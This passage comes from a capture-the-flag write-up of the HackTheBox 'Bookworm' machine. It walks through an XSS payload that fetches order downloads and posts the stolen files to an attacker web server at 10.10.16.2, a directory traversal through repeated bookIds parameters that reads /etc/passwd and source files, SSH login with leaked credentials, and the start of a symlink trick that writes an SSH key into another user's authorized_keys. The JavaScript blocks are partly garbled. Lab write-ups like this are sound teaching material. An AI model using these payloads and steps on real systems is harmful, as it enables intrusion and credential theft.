+              <a class="nav-link" href="/shop">Shop</a>
+            </ul>
+            <div class="navbar-nav">
+              
+                <a class="nav-link" href="/basket">Basket (0)</a>
+                <a class="nav-link" href="/profile">Jakub Particles</a>
+                <img class="nav-brand" height="40" src="/static/img/uploads/3" width="40">
+              
+            </img></div>
+          </div>
+      </div>
+    </nav>
+
+  <div class="container mt-2">
+      
+
+<h1>Viewing Order 8</h1>
+
+<p style="white-space: pre-line"><strong>Shipping Address:</strong><br/>Jakub Particles
+  16 Station Avenue
+  
+  Bradford
+  BD60 0ZZZ</p>
+
+
+<table class="table">
+  <thead>
+    <tr>
+      <th scope="col">Book</th>
+      <th scope="col">Quantity</th>
+      <th scope="col">Total Price</th>
+      <th scope="col">Note</th>
+      
+      <th scope="col"></th>
+      
+    </tr>
+  </thead>
+  <tbody>
+    
+    <tr>
+      <th scope="row">Ye Book of Copperheads</th>
+      <td>2</td>
+      <td>�54</td>
+      <td>
+        
+      </td>
+      
+      <td>
+        <a download="Ye Book of Copperheads.pdf" href="/download/8?bookIds=10">Download e-book</a>
+        </td>
+      
+    </tr>
+    
+    <tr>
+      <th scope="row">La vigna vendemmiata: novelle</th>
+      <td>1</td>
+      <td>�26</td>
+      <td>
+        
+      </td>
+      
+      <td>
+        <a download="La vigna vendemmiata: novelle.pdf" href="/download/8?bookIds=11">Download e-book</a>
+        </td>
+      
+    </tr>
+    
+  </tbody>
+</table>
+
+  
+  <a download="" href="/download/8?bookIds=7&amp;bookIds=20">Download everything</a>
+  
+
+<a href="/profile">View Your Other Orders</a>
+
+  </div>
+
+  </body>
+</html></code>
+</pre>
+<p id="52a75948-2f75-4fc0-87c5-ac8b79e05325">
+We successfully retrieved the content of orders from Jakub Particles user.</p>
+<h2 id="70ea5708-162d-4c14-b5f5-99aff3a46d9e">Directory Traversal</h2>
+<p id="b07fbdef-337f-4fee-82b4-a14b3e0b81b1">
+Now, we have the <strong>download URLs</strong>
+ (like <strong>/download/8?bookIds=10</strong>
+). We can edit our exploit to make the victim send a request to any <strong>download URL</strong>
+ and try to send the result to our web server : </p>
+<pre class="code" id="7a15bfd6-9fe9-4a65-8b7c-63d61e7effab"><code>//Declare constantes
+const base_url = "http://bookworm.htb"
+const profile_url = base_url+"/profile";
+const attacker = "http://10.10.16.2";
+const max_order = 3;
+
+//Function used to extract order ids from the text passed in 'pageContent' parameter
+function extractOrders(pageContent){
+    var lines = pageContent.split("\n");
+    var orders = new Array();
+    //Process each lines of the data passed in the "pageContent" parameter
+    //We start the loop at 1 to skip the line containing "Order History"
+    for(var i=1;i<lines.length;i++){ !="-1){" "="" ")="" "...="" "exfil");="" "octet="" "orders"="" &&="" (index="" (xhr.readystate="4" *="" 200...="" 70)="" 71st="" ;="" <="" a="" add="" always="" and="" array="" attacker="" attacker+"="" avoid="" blob="new" blob([xhr.response],="" blob,="" bookworm.htb="" check="" code="" contains="" data="" download="" downloadlink="extractDownloadLink(getOrders());" each="" exfil="new" exfil.open("post",="" exfil.send(fd);="" exfiltrate="" exfiltratedata();<="" exfiltratedata(){="" exploit="" extract="" extractdownloadlink(ordersarray){="" extractorders(request.responsetext);="" false);="" fd="new" fd.append('files',="" file="" for="" for(var="" formdata();="" from="" function="" get="" getorders(){="" hanging="" higher="" http="" http:="" hyperlink="" i="0;i&lt;orders_number;i++){" id="" ids="" if="" if(line.indexof("="" if(max_order="" if(request.status="200){" is="" it="" later="" lfi="" line="" link="" list="" long="" max_order="" much="" number="" or="" order="" orders="" orders.push(string[0]);="" orders;="" orders_number="max_order;" orders_number){="" page="" prevent="" process="" processing="" profile="" profile_url,="" receive="" request="" request.open('get',="" request.send(null);="" response="" retrieve="" return="" run="" script="" send="" server="" stream"});="" string='string[1].split("\"");' string[0];="" than="" the="" to="" too="" true);="" try="" upload",="" url="base_url+downloadLink;" url,="" used="" valid="" var="" we="" web="" webserver="" which="" xhr="new" xhr.onreadystatechange="function()" xhr.open("get",="" xhr.responsetype="arraybuffer" xhr.send();="" xhr.status="200)" xmlhttprequest();="" {="" {type:="" }="">
+</lines.length;i++){></code></pre>
+<p id="6740aca5-0d47-4f60-bd57-8984b15f10a3">
+First, we need to start a python web server that supports file uploads. We can use the module <a href="https://pypi.org/project/uploadserver/"><strong>uploadserver</strong>
+</a>
+</p>
+<pre class="code" id="c9dfc6de-2c5d-4049-8fb2-bdb745b10fc5"><code>┌──(kali㉿kali)-[~/…/HTB/CTF/Insane/Bookworm]
+└─$ python3 -m uploadserver 80
+File upload available at /upload
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</code>
+</pre>
+<p id="85be3ed9-a342-4eea-bf05-35a5241c8c2a">
+Now, we can try to use this exploit by doing again the same steps as before. Then, let’s take a look at our web server after waiting some time : </p>
+<pre class="code" id="9ac0f469-5af1-45df-b76f-2891e28d9345"><code>┌──(kali㉿kali)-[~/…/HTB/CTF/Insane/Bookworm]
+└─$ python3 -m uploadserver 80
+File upload available at /upload
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.129.175.101 - - [02/Jun/2023 07:17:52] [Uploaded] "exfil" --&gt; /home/kali/Documents/HTB/CTF/Insane/Bookworm/exfil
+10.129.175.101 - - [02/Jun/2023 07:17:52] "POST /upload HTTP/1.1" 204 -</code>
+</pre>
+<p id="51d81490-b1b0-42f4-bbc2-1a54ca899283">
+We successfully received the file. Let’s see what type of file it is : </p>
+<pre class="code" id="3986bc14-d89d-44ed-9219-77609850395d"><code>┌──(kali㉿kali)-[~/…/HTB/CTF/Insane/Bookworm]
+└─$ file exfil
+exfil: PDF document, version 1.3, 1 pages</code>
+</pre>
+<p id="3df7d338-5df1-48af-842f-d87545c0f01a">
+It’s a PDF file. Let’s open it : </p>
+<a href="HackTheBox%20-%20Bookworm%20(Insane)%201d96cef73dc648d0b4185f9889ec5082/Untitled%2019.png"><img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-/main//Bookworm/Untitled%2019.png"/></a>
+<p id="37bd345c-0d79-4402-8150-52536e3a3c0f">
+So now, we are able to download a file from the <strong>XSS (Cross Site Scripting)</strong>
+ vulnerability. We can try to exploit a <strong>Directory Traversal</strong>
+ on the <strong>download URL</strong>
+. I tried to download for example <strong>/download/8?bookIds=/etc/passwd</strong>
+ or <strong>/download/8?bookIds=../../../../../../etc/passwd</strong>
+ but it didn’t worked (it returned <strong>Not found</strong>
+ or <strong>Forbidden</strong>
+). Since the parameter in the URL is <strong>bookIds</strong>
+ with a <strong>S</strong>
+ at the end, I started thinking that we can append multiple <strong>bookIds</strong>
+ parameter in the URL to download multiple books at a time. I tried to add a second <strong>bookIds</strong>
+ parameter in the URL containing the relative path to <strong>/etc/passwd</strong>
+  like so :</p>
+<p id="d3705cb0-3cf7-4c11-a03c-44387856d5a8">
+<strong>/download/8?bookIds=10&amp;bookIds=../../../../etc/passwd</strong>
+ </p>
+<p id="37cfff2b-0089-4576-9557-b7e44cdb952d">
+Here is the new exploit : </p>
+<pre class="code" id="1adff82c-1548-42e3-946b-e5ceb358c58d"><code>//Declare constantes
+const base_url = "http://bookworm.htb"
+const profile_url = base_url+"/profile";
+const attacker = "http://10.10.16.2";
+const max_order = 3;
+
+//Function used to extract order ids from the text passed in 'pageContent' parameter
+function extractOrders(pageContent){
+    var lines = pageContent.split("\n");
+    var orders = new Array();
+    //Process each lines of the data passed in the "pageContent" parameter
+    //We start the loop at 1 to skip the line containing "Order History"
+    for(var i=1;i<lines.length;i++){ !="-1){" "="" ")="" "...="" "exfil");="" "octet="" "orders"="" &&="" (i="" (index="" (xhr.readystate="4" *="" 200...="" 70)="" 71st="" 80="" ;="" <="" a="" add="" always="" and="" array="" attacker="" attacker+"="" avoid="" blob="new" blob([xhr.response],="" blob,="" bookworm.htb="" check="" code="" contains="" create="" download="" downloadlink="extractDownloadLink(getOrders());" each="" exfil="new" exfil.open("post",="" exfil.send(fd);="" exfiltrate="" exfiltratedata();<="" exfiltratedata(){="" exploit="" extract="" extractdownloadlink(ordersarray){="" extractorders(request.responsetext);="" false);="" fd="new" fd.append('files',="" file="" files="" for="" for(var="" formdata();="" from="" function="" get="" getorders(){="" hanging="" higher="" http="" http:="" hyperlink="" i="0;i&lt;orders_number;i++){" id="" ids="" if="" if(line.indexof("="" if(max_order="" if(request.status="200){" is="" it="" later="" lfi="" lfi_url="base_url+downloadLink;" line="" link="" list="" long="" max_order="" module="" much="" number="" on="" or="" order="" orders="" orders.push(string[0]);="" orders;="" orders_number="max_order;" orders_number){="" page="" port="" prevent="" process="" processing="" profile="" profile_url,="" python3)="" receive="" request="" request.open('get',="" request.send(null);="" response="" retrieve="" return="" run="" script="" send="" stream"});="" string='string[1].split("\"");' string[0];="" than="" the="" to="" too="" true);="" trying="" upload",="" uploadserver="" url='lfi_url+"&amp;bookIds=../../../../etc/passwd";' url,="" used="" valid="" var="" we="" webserver="" which="" xhr="new" xhr.onreadystatechange="function()" xhr.open("get",="" xhr.responsetype="arraybuffer" xhr.send();="" xhr.status="200)" xmlhttprequest();="" {="" {type:="" }="">
+</lines.length;i++){></code></pre>
+<p id="76c1f1c8-214d-4af9-a0d4-d59c5b3340f6">
+I successfully received the file. Let’s see what’s in it : </p>
+<pre class="code" id="edda8b75-3123-4407-9d8b-9df32b1ae8d8"><code>┌──(kali㉿kali)-[~/…/HTB/CTF/Insane/Bookworm]
+└─$ file exfil       
+exfil: Zip archive data, at least v2.0 to extract, compression method=deflate</code>
+</pre>
+<p id="fa642947-5cf1-4009-b148-7c5b04a8287d">
+This time, it’s a zip file. So when we download multiple PDFs at the same time, the server compress them in a zip file. Let’s try to open it : </p>
+<a href="HackTheBox%20-%20Bookworm%20(Insane)%201d96cef73dc648d0b4185f9889ec5082/Untitled%2020.png"><img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-/main//Bookworm/Untitled%2020.png"/></a>
+<p id="a2dfcbf5-8159-41e6-a92c-1ead97738c93">
+We have two files. Let’s unzip this archive and read <strong>Unknown.pdf</strong>
+ with cat : </p>
+<pre class="code" id="6038fbe6-8897-4b40-93d8-fbd75c690ace"><code>┌──(kali㉿kali)-[~/…/HTB/CTF/Insane/Bookworm]
+└─$ unzip exfil   
+Archive:  exfil
+  inflating: Alice's Adventures in Wonderland.pdf  
+  inflating: Unknown.pdf             
+                                                             
+┌──(kali㉿kali)-[~/…/HTB/CTF/Insane/Bookworm]
+└─$ cat Unknown.pdf 
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+frank:x:1001:1001:,,,:/home/frank:/bin/bash
+neil:x:1002:1002:,,,:/home/neil:/bin/bash
+mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
+fwupd-refresh:x:114:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+_laurel:x:997:997::/var/log/laurel:/bin/false</code>
+</pre>
+<p id="1ccd533f-7701-4c9a-b40a-dc73d8f6922e">
+We successfully exploited a <strong>LFI (Local File Inclusion)</strong>
+ from the <strong>XSS (Cross Site Scripting)</strong>
+ vulnerability. Now, here’s the final exploit I made. I just added some lines to avoid data corruption when retrieving or sending the zip file. I also added a constant that contains the file name we want to retrieve from the <strong>LFI (Local File Inclusion)</strong>
+. I just have to change its value to retrieve the file I want from the web server : </p>
+<pre class="code" id="edfcc607-d8dc-4d1e-9db2-aeacec32ce9b"><code>//Declare constantes
+const base_url = "http://bookworm.htb"
+const profile_url = base_url+"/profile";
+const attacker = "http://10.10.16.2";
+const max_order = 3;
+const lfi_file = "/etc/passwd";
+
+//Function used to extract order ids from the text passed in 'pageContent' parameter
+function extractOrders(pageContent){
+    var lines = pageContent.split("\n");
+    var orders = new Array();
+    //Process each lines of the data passed in the "pageContent" parameter
+    //We start the loop at 1 to skip the line containing "Order History"
+    for(var i=1;i<lines.length;i++){ !="-1){" "="" ")="" "*");="" "...="" "octet="" "orders"="" &&="" (i="" (index="" (xhr.readystate="4" *="" 200...="" 70)="" 71st="" 80="" ;="" <="" a="" add="" always="" and="" array="" attacker="" attacker+"="" avoid="" blob="new" blob([xhr.response],="" blob,="" bookworm.htb="" check="" code="" contains="" create="" download="" downloadlink="extractDownloadLink(getOrders());" each="" exfil="new" exfil.open("post",="" exfil.send(fd);="" exfiltrate="" exfiltratedata();<="" exfiltratedata(){="" exploit="" extract="" extractdownloadlink(ordersarray){="" extractorders(request.responsetext);="" false);="" fd="new" fd.append('files',="" file="" filename='lfi_file.split("/").at(-1)+".zip";' filename);="" files="" for="" for(var="" formdata();="" from="" function="" get="" getorders(){="" hanging="" higher="" http="" http:="" hyperlink="" i="0;i&lt;orders_number;i++){" id="" ids="" if="" if(line.indexof("="" if(max_order="" if(request.status="200){" is="" it="" later="" lfi="" lfi_url="base_url+downloadLink;" line="" link="" list="" long="" max_order="" module="" much="" number="" on="" or="" order="" orders="" orders.push(string[0]);="" orders;="" orders_number="max_order;" orders_number){="" page="" port="" prevent="" process="" processing="" profile="" profile_url,="" python3)="" receive="" request="" request.open('get',="" request.send(null);="" response="" retrieve="" return="" run="" script="" send="" stream"});="" string='string[1].split("\"");' string[0];="" than="" the="" to="" too="" true);="" upload",="" uploadserver="" url="" url,="" used="" valid="" var="" we="" webserver="" which="" xhr="new" xhr.onreadystatechange="function()" xhr.open("get",="" xhr.responsetype="arraybuffer" xhr.send();="" xhr.setrequestheader("access-control-allow-origin",="" xhr.setrequestheader("content-type","application="" xhr.status="200)" xmlhttprequest();="" zip");="" {="" {type:="" }="">
+</lines.length;i++){></code></pre>
+<p id="998bebf7-e931-4dae-a5bc-dad840f81279">
+So I changed the value of <strong>lfi_file</strong>
+ constant to <strong>/var/www/bookworm/index.js</strong>
+ (since the webserver is running <strong><a href="https://nodejs.org/en">Node.js</a>
+</strong>
+<strong>bookworm</strong>
+) and done the same steps as before again : </p>
+<pre class="code" id="8dd61d16-3e54-4d02-a014-c3b606db449b"><code>const express = require("express");
+const nunjucks = require("nunjucks");
+const path = require("path");
+const session = require("cookie-session");
+const fileUpload = require("express-fileupload");
+const archiver = require("archiver");
+const fs = require("fs");
+const { flash } = require("express-flash-message");
+const { sequelize, User, Book, BasketEntry, Order, OrderLine } = require("./database");
+const { hashPassword, verifyPassword } = require("./utils");
+const { QueryTypes } = require("sequelize");
+const { randomBytes } = require("node:crypto");
+const timeAgo = require("timeago.js");
+
+const app = express();
+const port = 3000;
+[CROPPED]</code>
+</pre>
+<p id="769dfb74-3f41-4dea-b673-047c20350cae">
+You can see <strong>require("./database")</strong>
+ in the first lines of the file. It seems that it includes the file <strong>database.js</strong>
+ in the same directory. It may contains the configuration for the database (<strong>credentials</strong>
+ for example). Here is the content of <strong>/var/www/bookworm/database.js</strong>
+ : </p>
+<pre class="code" id="d94efda3-14bf-4818-8e6d-27502d8bea1a"><code>const { Sequelize, Model, DataTypes } = require("sequelize");
+
+//const sequelize = new Sequelize("sqlite::memory::");
+const sequelize = new Sequelize(
+  process.env.NODE_ENV === "production"
+    ? {
+        dialect: "mariadb",
+        dialectOptions: {
+          host: "127.0.0.1",
+          user: "bookworm",
+          database: "bookworm",
+          password: "[HIDDEN]",
+        },
+    logging: false,
+      }
+    : "sqlite::memory::"
+);
+
+[CROPPED]</code>
+</pre>
+<p id="0adcb2df-81dd-4b6e-8193-9010d0515aa4">
+We have the <strong>credentials</strong>
+ for <a href="https://www.mysql.com/"><strong>MySQL</strong>
+</a>
+<strong>frank</strong>
+. Let’s try to login via SSH as <strong>frank</strong>
+ using the password we just found : </p>
+<pre class="code" id="3c203c8c-28c1-4d88-9477-813e840b4c3a"><code>┌──(kali㉿kali)-[~/…/CTF/Insane/Bookworm/exploits]
+└─$ ssh frank@bookworm.htb 
+frank@bookworm.htb's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-149-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri 02 Jun 2023 11:40:15 AM UTC
+
+  System load:           0.13
+  Usage of /:            80.6% of 6.24GB
+  Memory usage:          23%
+  Swap usage:            0%
+  Processes:             239
+  Users logged in:       0
+  IPv4 address for eth0: 10.129.175.101
+  IPv6 address for eth0: dead:beef::250:56ff:fe96:3bd8
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Fri Jun  2 06:43:34 2023 from 10.10.16.2
+frank@bookworm:~$</code>
+</pre>
+<p id="f8ae36cd-2d9f-4c80-98b7-d68bd5e8f0e5">
+Now we have a foothold as <strong>frank</strong>
+.</p>
+<h1 id="c272b349-25db-46dd-88f6-f7fb97cdd617">Post-exploitation</h1>
+<h2 id="acd64a9b-eebe-4a6e-995d-e2498c430203">Local enumeration</h2>
+<p id="ce274340-023c-453f-9b21-6838873c58ec">
+If we take a look in the <strong>/home</strong>
+ directory, we can see a user directory called <strong>neil</strong>
+. In <strong>/home/neil</strong>
+, there is a directory called <strong>converter</strong>
+. Here is what we can find in <strong>/home/neil/converter</strong>
+ : </p>
+<pre class="code" id="73aef6ec-01c2-424a-856e-8e786ad39349"><code>frank@bookworm:/home/neil/converter$ ls -la
+total 104
+drwxr-xr-x  7 root root  4096 May  3 15:34 .
+drwxr-xr-x  6 neil neil  4096 Jun  2 22:06 ..
+drwxr-xr-x  8 root root  4096 May  3 15:34 calibre
+-rwxr-xr-x  1 root root  1658 Feb  1 09:13 index.js
+drwxr-xr-x 96 root root  4096 May  3 15:34 node_modules
+drwxrwxr-x  3 root neil  4096 Jun  2 22:00 output
+-rwxr-xr-x  1 root root   438 Jan 30 19:46 package.json
+-rwxr-xr-x  1 root root 68895 Jan 30 19:46 package-lock.json
+drwxrwxr-x  2 root neil  4096 Jun  2 22:05 processing
+drwxr-xr-x  2 root root  4096 May  3 15:34 templates</code>
+</pre>
+<p id="cf6465e6-2f46-45c2-8e83-779138ec01d1">
+It looks like a <strong><a href="https://nodejs.org/en">Node.js</a>
+</strong>
+<strong>index.js</strong>
+ file : </p>
+<pre class="code" id="5348befc-25dc-4f9c-94a6-504582bdd009"><code>frank@bookworm:/home/neil/converter$ cat index.js 
+const express = require("express");
+const nunjucks = require("nunjucks");
+const fileUpload = require("express-fileupload");
+const path = require("path");
+const { v4: uuidv4 } = require("uuid");
+const fs = require("fs");
+const child = require("child_process");
+
+const app = express();
+const port = 3001;
+
+nunjucks.configure("templates", {
+  autoescape: true,
+  express: app,
+});
+
+app.use(express.urlencoded({ extended: false }));
+app.use(
+  fileUpload({
+    limits: { fileSize: 2 * 1024 * 1024 },
+  })
+);
+
+const convertEbook = path.join(__dirname, "calibre", "ebook-convert");
+
+app.get("/", (req, res) =&gt; {
+  const { error } = req.query;
+
+  res.render("index.njk", { error: error === "no-file" ? "Please specify a file to convert." : "" });
+});
+
+app.post("/convert", async (req, res) =&gt; {
+  const { outputType } = req.body;
+
+  if (!req.files || !req.files.convertFile) {
+    return res.redirect("/?error=no-file");
+  }
+
+  const { convertFile } = req.files;
+
+  const fileId = uuidv4();
+  const fileName = `${fileId}${path.extname(convertFile.name)}`;
+  const filePath = path.resolve(path.join(__dirname, "processing", fileName));
+  await convertFile.mv(filePath);
+
+  const destinationName = `${fileId}.${outputType}`;
+  const destinationPath = path.resolve(path.join(__dirname, "output", destinationName));
+
+  console.log(filePath, destinationPath);
+
+  const converter = child.spawn(convertEbook, [filePath, destinationPath], {
+    timeout: 10_000,
+  });
+
+  converter.on("close", (code) =&gt; {
+    res.sendFile(path.resolve(destinationPath));
+  });
+});
+
+app.listen(port, "127.0.0.1", () =&gt; {
+  console.log(`Development converter listening on port ${port}`);
+});</code>
+</pre>
+<p id="9a2d693c-2c67-4e25-8649-8d8c149adaf9">
+According to the <strong>port</strong>
+ constant, the application is listening on port <strong>3001</strong>
+. Let’s verify this by listing the listening ports using <strong>netstat -tulpn</strong>
+ : </p>
+<pre class="code" id="ff4e78fe-8097-4d6c-8a61-c8409abe81f2"><code>frank@bookworm:/home/neil/converter$ netstat -tulpn
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:46719         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3001          0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           -</code>
+</pre>
+<p id="b735fc5a-ddd8-4c6d-85bb-08ca90630edf">
+It is only listening locally. To access the service from our attacking host, we can port forward the port <strong>3001</strong>
+ to our host with <a href="https://doc.ubuntu-fr.org/ssh">ssh</a>
+</p>
+<pre class="code" id="2b19e6a9-61f4-4342-b69a-5957a9e446f0"><code>ssh frank@bookworm.htb -L 3001:localhost:3001</code>
+</pre>
+<p id="1fc1c85d-eee6-4948-b559-a29331fe8156">
+Now, if we go to <strong><a href="http://localhost:3001/">http://localhost:3001/</a>
+</strong>
+</p>
+<a href="HackTheBox%20-%20Bookworm%20(Insane)%201d96cef73dc648d0b4185f9889ec5082/Untitled%2021.png"><img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-/main//Bookworm/Untitled%2021.png"/></a>
+<p id="19fc58f5-7ea2-4a2e-af60-9870b9a56f0a">
+We can convert a file to another type. For example, a PDF to an EPUB. By looking at the source code, we can see that it is possible to intercept the request with <a href="https://portswigger.net/burp"><strong>Burp Suite</strong>
+</a>
+<strong>outputType</strong>
+ parameter to change the directory where the converted file will be saved. </p>
+<h2 id="f77929c7-3e9b-4dfc-9f80-47f4d1b6a430">Privilege escalation (neil)</h2>
+<p id="027f7550-fa95-46d9-b898-53be4ae9a9f1">
+Since we can choose where to write our converted file, we could craft a <strong>malicious EPUB</strong>
+ containing a <strong>public ssh key</strong>
+. Then, we could create a directory in <strong>/tmp</strong>
+ named <strong>exploit</strong>
+ and create a <strong>symbolic link</strong>
+ in it that points to <strong>/home/neil/.ssh/authorized_keys</strong>
+. First, let’s download a dummy PDF and convert it to EPUB : </p>
+<pre class="code" id="99bbbe7e-a8e6-40e2-85ba-d18ae1a5550a"><code>┌──(kali㉿kali)-[~/…/CTF/Insane/Bookworm/exploits]
+└─$ ls -la
+total 84
+drwxr-xr-x 2 kali kali  4096 Jun  2 18:45 .
+drwxr-xr-x 5 kali kali  4096 Jun  2 18:45 ..
+-rw-r--r-- 1 kali kali 72055 Jun  2 18:44 convert.epub
+-rw-r--r-- 1 kali kali  3392 Jun  2 05:37 exploit.js.png</code>
+</pre>
+<p id="dc66eb98-6fff-422e-ab1e-50a0bcf5d376">
+We have our dummy EPUB file. Now, we can extract it : </p>
+<pre class="code" id="eb5a8014-e85b-43d9-be38-184fd152c607"><code>┌──(kali㉿kali)-[~/…/CTF/Insane/Bookworm/exploits]
+└─$ unzip convert.epub -d exploit
+Archive:  convert.epub
+ extracting: exploit/mimetype        
+   creating: exploit/META-INF/
+  inflating: exploit/META-INF/container.xml  
+  inflating: exploit/index_split_001.html  
+  inflating: exploit/toc.ncx         
+  inflating: exploit/stylesheet.css  
+  inflating: exploit/page_styles.css  
+  inflating: exploit/titlepage.xhtml  
+  inflating: exploit/cover_image.jpg  
+  inflating: exploit/index_split_000.html  
+  inflating: exploit/content.opf</code>
+</pre>
+<p id="1f6f227f-4426-45e2-b452-d3c385377e31">
+Now, we can generate a pair of SSH keys : </p>
+<pre class="code" id="b58615f4-2532-44d8-a380-23e7735413f7"><code>┌──(kali㉿kali)-[~/…/CTF/Insane/Bookworm/exploits]
+└─$ ssh-keygen -f id_rsa
+Generating public/private rsa key pair.
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in id_rsa
+Your public key has been saved in id_rsa.pub
+The key fingerprint is:
+SHA256:GW6ykLjA16xEhMUWgbW212pAzVXaHtIHInVjHEu5iFc kali@kali
+The key's randomart image is:
++---[RSA 3072]----+
+|  **o..+oOo      |
+| o.o+ o OE+      |
+|  .= o.o+=..     |
+|. +.+o.+o+o      |
+|...=o+o.S.       |
+| .o.+..+         |
+|  .. o.          |
+|    .            |
+|                 |
++----[SHA256]-----+</code>
+</pre>
+<p id="c5ea26a3-cf7d-46ea-b35d-639001ef933c">
+Then, we can go in the directory where we extracted the EPUB file and replace the file <strong>cover_image.jpg</strong>
+ by the SSH public key we generated previously : </p>
+<pre class="code" id="cf8d1ed4-ee81-429c-b5d5-d7de8f40b91a"><code>┌──(kali㉿kali)-[~/…/Insane/Bookworm/exploits/exploit]
+└─$ rm cover_image.jpg                
+                                                              
+┌──(kali㉿kali)-[~/…/Insane/Bookworm/exploits/exploit]
+└─$ cp ../id_rsa.pub ./cover_image.jpg</code>
+</pre>
+<p id="644bbab6-20ef-49ff-a011-2469f4c08f8b">
+Now, we can rebuild our EPUB like so : </p>
+<pre class="code" id="367fba62-b7ba-4e1a-a350-a43f1e470907"><code>┌──(kali㉿kali)-[~/…/Insane/Bookworm/exploits/exploit]
+└─$ zip -rX ../exploit.epub mimetype META-INF/ *
+  adding: mimetype (stored 0%)
+  adding: META-INF/ (stored 0%)
+  adding: META-INF/container.xml (deflated 37%)
+  adding: content.opf (deflated 58%)
+  adding: cover_image.jpg (deflated 18%)
+  adding: index_split_000.html (deflated 48%)
+  adding: index_split_001.html (deflated 47%)
+  adding: page_styles.css (deflated 24%)
+  adding: stylesheet.css (deflated 60%)
+  adding: titlepage.xhtml (deflated 49%)
+  adding: toc.ncx (deflated 44%)
+                                                              
+┌──(kali㉿kali)-[~/…/Insane/Bookworm/exploits/exploit]
+└─$ file ../exploit.epub 
+../exploit.epub: EPUB document</code>
+</pre>
+<p id="ad951887-568f-42cd-a9b9-be24c7b9c2fc">
+Now, we can create an <strong>exploit</strong>
+ directory in <strong>/tmp</strong>
+ containing the <strong>symbolic link</strong>
+ on the victim host (don’t forget to add all permissions to everyone on the <strong>exploit</strong>
+ directory to ensure that the <a href="https://nodejs.org/en"><strong>Node.js</strong>
+</a>
+</p>
+<pre class="code" id="7b1c28ba-cd8d-435a-9c5f-a2ea9ed4054b"><code>frank@bookworm:/tmp$ mkdir exploit
+frank@bookworm:/tmp$ chmod a+rwx exploit/
+frank@bookworm:/tmp$ cd exploit/
+frank@bookworm:/tmp/exploit$ ln /home/neil/.ssh/authorized_keys -s cover_image.jpg
+frank@bookworm:/tmp/exploit$ ls
+cover_image.jpg</code>
+</pre>
+<p id="18a2fcc8-daa6-49e7-81e7-c5b15f46ea0b">
+Next, we can send our malicious EPUB and intercept the request to edit the <strong>outputType</strong>
+ parameter like so :</p>
